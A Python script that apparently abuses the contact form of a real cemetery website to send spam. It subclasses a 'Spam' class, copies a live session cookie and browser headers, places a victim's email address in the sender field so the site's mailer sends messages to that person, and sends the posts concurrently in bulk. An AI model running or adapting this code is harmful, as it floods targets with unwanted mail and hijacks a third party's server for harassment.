from os.path import basename

import requests

from module import Spam

cookies = {
    'PHPSESSID': '899b0b38a7669b5a5e47aef5ed5d4e07',
}

headers = {
    'authority': 'www.lrcemetery.co.uk',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'no-cache',
    # 'cookie': 'PHPSESSID=899b0b38a7669b5a5e47aef5ed5d4e07',
    'origin': 'https://www.lrcemetery.co.uk',
    'pragma': 'no-cache',
    'referer': 'https://www.lrcemetery.co.uk/main/contact.php',
    'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
}

s = 'Thank you for writing'


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        s = self.get_text()
        data = {
            'from_name': 'name',
            'from_email': target,
            'subject': s,
            'message': s,
            'validation_code': 'lrcem',
            'save_msg_butt_text': 'Save this message',
            'rtrv_msg_butt_text': 'Retrieve saved message',
        }

        response = requests.post('https://www.lrcemetery.co.uk/includes/process_mail.php', cookies=cookies,
                                 headers=headers, data=data)
        return response


def main():
    spam = ConcreteSpam(basename(__file__).removesuffix('.py'), s)
    res = spam.send_post()
    if res:
        spam.run_concurrently()


if __name__ == '__main__':
    main()
